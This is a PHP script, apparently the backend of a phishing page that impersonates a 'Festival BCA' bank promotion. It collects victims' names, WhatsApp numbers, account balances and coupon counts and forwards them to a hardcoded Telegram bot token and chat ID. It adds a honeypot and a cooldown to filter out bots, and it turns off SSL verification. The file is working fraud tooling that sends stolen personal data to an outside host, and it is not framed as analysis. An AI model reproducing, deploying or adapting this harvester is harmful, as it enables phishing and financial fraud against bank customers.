<?php
session_start();
header('Content-Type: application/json');

// 1. Cek Method POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit;
}

// 2. HONEYPOT TRAP (Mencegah Bot Otomatis)
// Jika field 'website' terisi, artinya yang ngisi adalah bot!
if (!empty($_POST['website'])) {
    echo json_encode(['success' => true]); // Pura-pura sukses biar bot bingung
    exit;
}

// 3. RATE LIMITING / COOLDOWN (Mencegah Spam Klik Berulang)
$currentTime = time();
if (isset($_SESSION['last_submit_time'])) {
    $timeDiff = $currentTime - $_SESSION['last_submit_time'];
    if ($timeDiff < 30) { // Cooldown 30 detik
        echo json_encode([
            'success' => false, 
            'message' => 'Harap tunggu ' . (30 - $timeDiff) . ' detik sebelum mengirim lagi.'
        ]);
        exit;
    }
}

// Token & Chat ID Telegram
$botToken = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU"; // Ganti Token Bot Anda
$chatID   = "6742478722";                            // Ganti Chat ID Anda

// Ambil & Bersihkan Input
$nama  = isset($_POST['nama']) ? htmlspecialchars(trim($_POST['nama'])) : '';
$wa    = isset($_POST['wa']) ? preg_replace('/[^0-9]/', '', $_POST['wa']) : '';
$saldo = isset($_POST['saldo']) ? htmlspecialchars(trim($_POST['saldo'])) : '';
$kupon = isset($_POST['kupon']) ? htmlspecialchars(trim($_POST['kupon'])) : '0';

// 4. VALIDASI NOMOR WHATSAPP (Mencegah Input Asal)
if (strlen($wa) < 10 || strlen($wa) > 14) {
    echo json_encode(['success' => false, 'message' => 'Nomor WhatsApp tidak valid (minimal 10 digit).']);
    exit;
}

if (strlen($nama) < 3) {
    echo json_encode(['success' => false, 'message' => 'Nama terlalu pendek.']);
    exit;
}

// Catat Waktu Submit Terakhir ke Session
$_SESSION['last_submit_time'] = $currentTime;

// Format Pesan ke Telegram
$message = "🔔 *DATA FESTIVAL BCA*\n\n"
         . "👤 *Nama:* " . $nama . "\n"
         . "📱 *WhatsApp:* " . $wa . "\n"
         . "💰 *Saldo:* " . $saldo . "\n"
         . "🎟️ *Total Kupon:* " . $kupon . " Kupon";

// Kirim ke Telegram API via cURL
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
$data = [
    'chat_id'    => $chatID,
    'text'       => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
curl_close($ch);

if ($response) {
    $resArray = json_decode($response, true);
    if (isset($resArray['ok']) && $resArray['ok'] === true) {
        echo json_encode(['success' => true]);
        exit;
    }
}

echo json_encode(['success' => false, 'message' => 'Gagal mengirim data']);
?>
